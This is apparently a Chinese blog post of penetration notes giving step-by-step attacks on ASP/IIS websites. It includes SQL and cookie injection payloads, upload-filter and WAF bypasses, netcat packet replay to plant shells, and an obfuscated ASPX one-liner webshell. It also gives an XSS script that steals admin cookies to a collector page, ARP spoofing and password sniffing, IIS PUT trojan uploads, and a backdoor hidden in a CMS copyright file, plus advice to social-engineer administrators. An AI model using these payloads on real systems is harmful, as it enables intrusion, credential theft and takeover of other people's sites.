<h1 id="因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1-html拖进火狐浏览器里，直接点击备份即可突破cookie验证！"><a href="#因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1-html拖进火狐浏览器里，直接点击备份即可突破cookie验证！" class="headerlink" title="因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！"></a>因为火狐浏览器有保留cookie的功能，先登录后台，以管理员的权限进行上传，直接把1.html拖进火狐浏览器里，直接点击备份即可突破cookie验证！</h1><p>【 本地构造限制上传类型漏洞 】<br>一般用于直接扫到的上传页面，名称是：上传图片，上传asp、asa等脚本时提示“请选择jpg或gif文件!”<br>这时通过这个方法一般都能成功，首先保存到本地1.asp 放到小旋风的目录下，然后找到以下这段代码：<br>alert(“请点击浏览按钮，选择您要上传的jpg或gif文件!”)<br>myform.file1.focus;<br>return (false);<br>}<br>else<br>{<br>str= myform.file1.value;<br>strs=str.toLowerCase();<br>lens=strs.length;<br>extname=strs.substring(lens-4,lens);<br>if(extname!=”.jpg” &amp;&amp; extname!=”.gif”)<br>{<br>alert(“请选择jpg或gif文件!”);<br>看到这句代码：if(extname!=”.jpg” &amp;&amp; extname!=”.gif”) 改为： if(extname!=”.jpg” &amp;&amp; extname!=”.gif” &amp;&amp; extname!=”.asp”)</p>
<h1 id="然后补充完整上传地址，action-这里，然后网页打开127-0-0-1-直接上传asp文件就可以了。"><a href="#然后补充完整上传地址，action-这里，然后网页打开127-0-0-1-直接上传asp文件就可以了。" class="headerlink" title="然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。"></a>然后补充完整上传地址，action=这里，然后网页打开127.0.0.1 直接上传asp文件就可以了。</h1><p>【 抓包改包NC提交拿shell 】<br>1.抓包数据中如果存在name=”filepath”或是name=”filename”，那么就可以满足NC的上传条件了。<br>2.将木马的抓包数据复制到文本文件中。例如：1.txt<br>3.将路径补全：<br>filepath截断法：<br>uploadfile/路径后添加1.asp空格 (16进制下面将20改为00)<br>filename自定义名称：<br>C:\Documents and Settings\lei\桌面\1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)<br>3.在Content-Length处加上../uploadfile/后增加的字节数。<br>4.用C32将空格的20改为00，保存为1.txt。<br>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv www.XXXX.com 80&lt;1.txt</p>
<h1 id="如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php-再不行就用IIS-6-0解析漏洞，将文件名改为1-asa-1-jpg"><a href="#如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php-再不行就用IIS-6-0解析漏洞，将文件名改为1-asa-1-jpg" class="headerlink" title="( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )"></a>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</h1><p>【 抓包nc上传获取管理权限 】<br>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。<br>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。<br>在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc\1.txt 放在同一个目录下，cmd命令：nc 域名 80&lt;1.txt</p>
<h1 id="成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！"><a href="#成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！" class="headerlink" title="成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！"></a>成功提交上去后，刚才的会员帐户将变成管理员帐户了，找到该站的后台地址登录即可实现cookie欺骗！</h1><p>【 cookie欺骗 】<br>当我们通过注入或是社工把管理员的帐号跟md5密码搞到手的时候，却发现破解不出密码 (MD5是16位加密的)</p>
<h1 id="那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。"><a href="#那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。" class="headerlink" title="那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。"></a>那么我们就可以用COOKIE欺骗来绕过，利用桂林老兵的cookie欺骗工具，把自己的ID以及md5密码都修改成管理员的，再修改cookie，访问时就会实现欺骗了。</h1><p>【 cookie中转突破防注入 】<br>有时检测一个网站，系统会弹出一些SQL防注入的提示框，这时我们可以利用COOKIE中转注入来进行突破，首先准备一个webshell，然后打开COOKIE中转工具。<br>复制注入点到“注入URL地址跟来源页”处，把问号去掉，再把问号后面的ID=剪切到“注入键名”里，再把ID=后面那个参数剪切到“POST提交值”里替换jmdcw=后面的参数。<br>点击生成，再把生成的文件上传到webshell里，然后访问路径，再页面地址后面加“?jmdcw=参数”，这样搭建构造出来的注入点就绕过防注入了！<br>以上是在webshell里搭建ASP坏境的方法，下面的是本地架设ASP环境的方法：</p>
<h1 id="利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面-文件名-问号-jmdcw-参数即可。"><a href="#利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面-文件名-问号-jmdcw-参数即可。" class="headerlink" title="利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。"></a>利用简易IIS服务器搭建一个环境，再将COOKIE中转生成的文件放到简易IIS服务器的目录下！然后运行简易IIS服务器，在后面+文件名+问号+jmdcw=参数即可。</h1><p>【 cookie手工突破防注入 】<br>第一种方法：<br>用 and 1=1 and 1=2 检测网站是否存在注入点时，如果提示你的IP已被记录，就说明系统做了防注入措施，可以用代码来突破。<br>管理员只过滤了and，但是没有过滤or，我们可以先猜网站的字段数 格式：order by 数字 猜到错为止，然后选前一个对的数字！<br>比如猜到14错误，那就是13了，然后利用Cookie提交变量值，代码：javascript:alert(document.cookie=id=”+escape(“这里填写变量值，例如：id=408”));<br>开始猜解表段，代码：javascript:alert(document.cookie=”id=”+escape(“变量值 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13 from admin”));<br>复制在浏览器里打开，将出现一个提示框，点击确定就会注射进去，再重新打开网站（要在此处打开，所以前面最好复制下网站地址）<br>然后就会出现两个提示数字，比如5跟6，然后在代码的5跟6处猜帐号密码，常见的帐号有：user username 密码:pass password<br>复制修改后的代码放到浏览器里打开，就会爆破出网站的帐号密码了。<br>第二种方法：<br>注入点：<a href="http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098" target="_blank" rel="external">http://www.XXXXXXXX.gov.cn/shownews.asp?id=4098</a><br>首先把?id=408去掉，然后访问如果提示“数据库出错”！就说明网站没有过滤Cookie提交方式，可以利用Cookie欺骗绕过防注入！<br>利用Cookie提交变量值，代码：javascript:alert(document.cookie=”id=”+escape(“4098”)<br>下面开始在Cookie注入中执行常规注入攻击，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=1”));<br>访问<a href="http://www.XXXXXXXX.gov.cn/shownews.asp" target="_blank" rel="external">http://www.XXXXXXXX.gov.cn/shownews.asp</a> 显示正常页面，<br>再提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2”)); 显示错误页面！<br>下面来开始猜解表段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select * from 表段)”))；<br>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”))； 例如：username<br>接着猜字段，提交代码：javascript:alert(document.cookie=”id=”+escape(“4098 and exists (select 字段 from admin)”)), 例如：password<br>下面开始猜字段数跟字段内容了，提交代码:javascript:alert(document.cookie=”id=”+escape(“4098 and 1=2 union select 1,2,3,4,5,6 from 表段”));<br>一直猜解到对为止，这里只是猜到6，记得继续加减！猜解到对的时候，页面会出现数字，然后在相对应的数字替换字段名，再进行提交代码！</p>
<h1 id="这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）"><a href="#这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）" class="headerlink" title="这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）"></a>这时如果字段名猜对的话，就会爆出帐号密码了，不对的话继续替换字段名，位置不变！（存在cookie注入时建议参考mysql手工注入的语句）</h1><p>【 伪静态注入 】<br>伪静态网站注入方法，通常情况下，动态脚本的网站的url类似下面这样：<br><a href="http://www.91ri.org/news.php?id=111" target="_blank" rel="external">http://www.91ri.org/news.php?id=111</a><br>做了伪静态之后就成这样了：<br><a href="http://www.91ri.org/news.php/id/111.html" target="_blank" rel="external">http://www.91ri.org/news.php/id/111.html</a><br>以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了。<br>常规的伪静态页面如下：<a href="http://www.XXX.com/play/Diablo.html" target="_blank" rel="external">http://www.XXX.com/play/Diablo.html</a><br>例如关联的动态页面是game.php ，那么当用户访问后程序会自动转换成类似<a href="http://www.XXX.com/game.php?action=play&amp;name=Diablo" target="_blank" rel="external">http://www.XXX.com/game.php?action=play&amp;name=Diablo</a> 的形式<br>注入点检测可以用：<a href="http://www.XXX.com/play/Diablo’" target="_blank" rel="external">http://www.XXX.com/play/Diablo’</a> and 1=’1.html与<a href="http://www.XXX.com/play/Diablo’" target="_blank" rel="external">http://www.XXX.com/play/Diablo’</a> and 1=’2.html来判断<br>通常情况下，动态脚本的网站的url类似下面这样：<a href="http://www.xxoo.net/aa.php?id=123" target="_blank" rel="external">http://www.xxoo.net/aa.php?id=123</a></p>
<h1 id="做了伪静态之后类似这样：http-www-xxoo-net-aa-php-id-123-html-以斜杠“-”代替了“-”并在最后加上-html，这样一来，就无法直接用工具来注入了！"><a href="#做了伪静态之后类似这样：http-www-xxoo-net-aa-php-id-123-html-以斜杠“-”代替了“-”并在最后加上-html，这样一来，就无法直接用工具来注入了！" class="headerlink" title="做了伪静态之后类似这样：http://www.xxoo.net/aa.php/id/123.html 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！"></a>做了伪静态之后类似这样：<a href="http://www.xxoo.net/aa.php/id/123.html" target="_blank" rel="external">http://www.xxoo.net/aa.php/id/123.html</a> 以斜杠“/”代替了“=”并在最后加上.html，这样一来，就无法直接用工具来注入了！</h1><p>【 嗅探 】<br>当入侵一个网站，该网站没有任何漏洞的情况下，可以进行旁注，再提权拿下任意一台服务器，不行的话就C段，提权拿下任意一台服务器。<br>只要能拿下同网段的任意一台服务器，就可以使用C段嗅探来获取主站的帐号密码，cain是一款强大的劫持工具。<br>在服务器里安装cain后打开主控端，点击配置-&gt;选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。<br>设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP测试(传播 31-位)，确定。<br>扫描完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！</p>
<h1 id="如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。"><a href="#如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。" class="headerlink" title="如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。"></a>如果发现没数据可以使用幻境网盾来限制网速，让cain的发包快过防火墙。</h1><p>【 arp欺骗 】<br>只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a 看一下，动态的服务器IP就能成功，静态的就不能。<br>安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用ARP欺骗、启用过滤器、启用分析器、启用修改器、主动转发” 确定。<br>设置–ARP欺骗–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑扫描C段)–确定。</p>
<h1 id="插件管理–修改器–最后一个选项双击–在右边的HTML-Body-haha-填写自己要展现的文字，点击开始即可欺骗成功！"><a href="#插件管理–修改器–最后一个选项双击–在右边的HTML-Body-haha-填写自己要展现的文字，点击开始即可欺骗成功！" class="headerlink" title="插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！"></a>插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！</h1><p>【 突破安全狗防注入及上传 】<br>写入webshell 写不进去，平常的一句话 也失效，用这段代码：<br>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“admin163.net”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;<br>连接端用cncert的aspx一句话客户端<br>2、IIS6.0解析漏洞遇到安全狗<br>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="external">http://www.baicai.com/1.asp;1.jpg</a><br>这样的会被IIS安全狗果断屏蔽<br>改成如下名称,IIS6一样会解析:<br>www.baicai.com/;1.asp;1.jpg<br>3、安全狗的注入绕过<br>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。<br>但这样就可以突破了：</p>
<h1 id="baicai-asp-0day5-com-00-amp-id-69-20-and-1-1"><a href="#baicai-asp-0day5-com-00-amp-id-69-20-and-1-1" class="headerlink" title="baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1"></a>baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1</h1><p>【 跨站xss 】<br>在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp&lt;%<br>thisfile=Server.MapPath(“cookie.txt”)<br>msg=Request(“msg”)<br>set fs=server.CreateObject(“scripting.filesystemobject”)<br>set thisfile=fs.OpenTextFile(thisfile,8,True,0)<br>thisfile.WriteLine(“=======cookie:”&amp;msg&amp;”======by:剑眉大侠”)<br>thisfile.close<br>set fs=nothing<br>%&gt;<br>首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。<br>然后在留言板的“您的网站”一处输入：<script>doucument.location=’<a href="http://127.0.0.1/1.asp?msg=’document.cookie">http://127.0.0.1/1.asp?msg=’document.cookie</a></script><br>当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！<br>然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）</p>
<h1 id="小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。"><a href="#小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。" class="headerlink" title="小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。"></a>小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去社工他即可。</h1><p>【 爆库 】<br>%5C为十六进制的\符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：<a href="http://www.xxx.com/rpc/show24.asp?id=127" target="_blank" rel="external">http://www.xxx.com/rpc/show24.asp?id=127</a><br>我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，<a href="http://www.xxx.com/rpc%5c/show24.asp?id=127" target="_blank" rel="external">http://www.xxx.com/rpc%5c/show24.asp?id=127</a><br>而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。<br>如果页面地址为：<a href="http://www.xx.com/rpd/#database.mdb" target="_blank" rel="external">http://www.xx.com/rpd/#database.mdb</a> ; 把%23替换#就可以下载了，即：<a href="http://www.xx.com/rpd/%23database.mdb" target="_blank" rel="external">http://www.xx.com/rpd/%23database.mdb</a><br>还有利用默认的数据库路径 <a href="http://www.xxx.com/" target="_blank" rel="external">http://www.xxx.com/</a> 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）<br>如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。</p>
<h1 id="这样的就是数据库了。下载时用FLASHGET换成-MDB格式的就行"><a href="#这样的就是数据库了。下载时用FLASHGET换成-MDB格式的就行" class="headerlink" title="这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行."></a>这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行.</h1><p>【 利用sql注入点判断网站和数据库是否站库分离 】<br>在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))</p>
<h1 id="注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。"><a href="#注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。" class="headerlink" title="注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。"></a>注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。</h1><p>【 iis6.0 PUT写入漏洞 】<br>利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序<br>1、IIS来宾用户对网站文件夹有写入权限<br>2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾<br>3、网站主目录:写入—打勾(可PUT)<br>4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）<br>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。<br>首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，<br>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。<br>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：www.xxx.com，然后在请求文件那里输入你的文件名，<br>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。</p>
<h1 id="直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。"><a href="#直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。" class="headerlink" title="直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。"></a>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</h1><p>【 ACCESS执行SQL语句导出一句话拿webshell 】<br>原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。<br>点“服务器信息探测”，获得网站路径：e:\web\webshellcc\的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。<br>create table cmd (a varchar(50)) 建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50<br>insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马<br>select * into [a] in ‘e:\web\webshellcc\1.asa;x.xls’ ‘excel 4.0;’ from cmd 把cmd表a的内容导出到路径e:\web\webshellcc\的EXCEL文件<br>drop table cmd 删除建立的cmd表</p>
<h1 id="菜刀连接：http-www-xxx-com-1-asa-x-xls"><a href="#菜刀连接：http-www-xxx-com-1-asa-x-xls" class="headerlink" title="菜刀连接：http://www.xxx.com/1.asa;x.xls"></a>菜刀连接：<a href="http://www.xxx.com/1.asa;x.xls" target="_blank" rel="external">http://www.xxx.com/1.asa;x.xls</a></h1><p>【 利用过滤’or’=’or’修改代码进行绕过 】<br>例如后台地址是：<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="external">http://www.hdminc.net/admin/admin_index.asp</a><br>当用万能密码登录的时候，会出现一些过滤or的提示！<br>请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！</p>
<p><script language="”javascript”"><br>function chencklogin()<br>{<br>if(document.login.username.value==”)<br>{alert(‘请输入用户名’);<br>document.login.username.focus();<br>return false<br>}<br>if (document.login.password.value==”)<br>{alert(‘请输入密码’);<br>document.login.password.focus();<br>return false<br>}<br>}<br></script><br>注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “<a href="http://www.hdminc.net/admin/admin_index.asp”" target="_blank" rel="external">http://www.hdminc.net/admin/admin_index.asp”</a></p>
<p><form action="”index.asp?action=chkadmin”" name="”login”" method="”past”" onsubmit="return" checklogin();”=""></form></p>
<h1 id="最后保存打开，再用’or’-’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！"><a href="#最后保存打开，再用’or’-’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！" class="headerlink" title="最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！"></a>最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！</h1><p>【 动力3.5拿shell 】<br>inurl:printpage.asp?ArticleID=<br>1.找到版权信息，把内容替换成：<br>版权所有 Copyright? 2003 <a href="’http://www.asp163.net’">动力空间</a>” ‘版权信息<br>if Request(“xiaoxin”)=”520″ then<br>dim allen,creat,text,thisline,path<br>if Request(“creat”)=”yes” then<br>Set fs = CreateObject(“Scripting.FileSystemObject”)<br>Set outfile=fs.CreateTextFile(server.mappath(Request(“path”)))<br>outfile.WriteLine Request(“text”)<br>Response.write “小新恭喜”<br>end if<br>Response.write “<form method="’POST’action='”&Request.ServerVariables(“URL”)&”?xiaoxin=520&creat=yes’">”
Response.write “<textarea name="’text’">”&thisline&”</textarea><br>”
Response.write “</form></p>
            
                

            
        </div>
    </div>
    <div class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">标签</span><br/>
                
    <a class="tag tag--primary tag--small t-link" href="/tags/渗透，sqlmap/">渗透，sqlmap</a>

            </div>
        
        <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/12/23/十大排序/"  data-tooltip="十大排序">
                
                    <i class="fa fa-angle-left"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">上一篇文章</span>
                </a>
            </li>
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/11/23/等待你的分享：记一次没有结果的等待/" data-tooltip="等待你的分享：记一次没有结果的等待">
                
                    <span class="hide-xs hide-sm text-small icon-mr">下一篇文章</span>
                    <i class="fa fa-angle-right"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        
        <li class="post-action hide-xs">
             <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至Twitter"href="https://twitter.com/intent/tweet?text=http://www.craymc.com/2015/12/23/渗透笔记/">
                <i class="fa fa-twitter"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至新浪微博" href="http://www.jiathis.com/send/?webid=tsina&amp;appkey=&amp;uid=你的uid&amp;url=http://www.craymc.com/2015/12/23/渗透笔记/&amp;title=渗透笔记">
                <i class="fa fa-weibo"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至微信" href="http://www.jiathis.com/send/?webid=weixin&amp;appkey=&amp;uid=你的uid&amp;url=http://www.craymc.com/2015/12/23/渗透笔记/&amp;title=渗透笔记">
                <i class="fa fa-weixin"></i>
            </a>
        </li>
    </ul>
</div>


        
            <section id="comments">    <!-- ��˵���ۿ� start -->    <div class="ds-thread" data-thread-key="post-渗透笔记" data-title="渗透笔记" data-url="http://www.craymc.com/2015/12/23/渗透笔记/"></div>    <!-- ��˵���ۿ� end -->    <!-- ��˵����JS���� start (һ����ҳֻ������һ��) -->    <script type="text/javascript">    var duoshuoQuery = {short_name:'geekmc'};      (function() {        var ds = document.createElement('script');        ds.type = 'text/javascript';ds.async = true;        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';        ds.charset = 'UTF-8';        (document.getElementsByTagName('head')[0]          || document.getElementsByTagName('body')[0]).appendChild(ds);      })();      </script>    <!-- ��˵����JS���� end --></section>
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2018 craymc. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/12/23/十大排序/"  data-tooltip="十大排序">
                
                    <i class="fa fa-angle-left"></i>
                    <span class="hide-xs hide-sm text-small icon-ml">上一篇文章</span>
                </a>
            </li>
            <li class="post-action">
                
                    <a class="post-action-btn btn btn--default tooltip--top" href="/2015/11/23/等待你的分享：记一次没有结果的等待/" data-tooltip="等待你的分享：记一次没有结果的等待">
                
                    <span class="hide-xs hide-sm text-small icon-mr">下一篇文章</span>
                    <i class="fa fa-angle-right"></i>
                </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        
        <li class="post-action hide-xs">
             <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至Twitter"href="https://twitter.com/intent/tweet?text=http://www.craymc.com/2015/12/23/渗透笔记/">
                <i class="fa fa-twitter"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至新浪微博" href="http://www.jiathis.com/send/?webid=tsina&amp;appkey=&amp;uid=你的uid&amp;url=http://www.craymc.com/2015/12/23/渗透笔记/&amp;title=渗透笔记">
                <i class="fa fa-weibo"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至微信" href="http://www.jiathis.com/send/?webid=weixin&amp;appkey=&amp;uid=你的uid&amp;url=http://www.craymc.com/2015/12/23/渗透笔记/&amp;title=渗透笔记">
                <i class="fa fa-weixin"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                <div id="share-options-bar" class="share-options-bar" data-behavior="4">
    <ul class="share-options">
       <li class="post-action hide-lg hide-md hide-sm">
            <a class="post-action-btn btn btn--default btn-open-shareoptions"  href="#btn-open-shareoptions">
                <i class="fa fa-share-alt"></i>
            </a>
        </li>
        
        <li class="post-action hide-xs">
             <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至Twitter"href="https://twitter.com/intent/tweet?text=http://www.craymc.com/2015/12/23/渗透笔记/">
                <i class="fa fa-twitter"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至新浪微博" href="http://www.jiathis.com/send/?webid=tsina&amp;appkey=&amp;uid=你的uid&amp;url=http://www.craymc.com/2015/12/23/渗透笔记/&amp;title=渗透笔记">
                <i class="fa fa-weibo"></i>
            </a>
        </li>
        <li class="post-action hide-xs">
            <a class="post-action-btn btn btn--default tooltip--top" target="new" data-tooltip="分享至微信" href="http://www.jiathis.com/send/?webid=weixin&amp;appkey=&amp;uid=你的uid&amp;url=http://www.craymc.com/2015/12/23/渗透笔记/&amp;title=渗透笔记">
                <i class="fa fa-weixin"></i>
            </a>
        </li>
    </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>

            
        </div>
        <div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.png"/>
        
            <h4 id="about-card-name">craymc</h4>
        
            <p id="about-card-bio"><p>荣枯事过已成梦，悲喜不惊便是禅。</p>
</p>
            <p id="about-card-bio"></p>
            <h5 id="about-card-bio"><p>十年饮冰，难凉热血</p>
</h5>
        
        
            <h5 id="about-card-job">
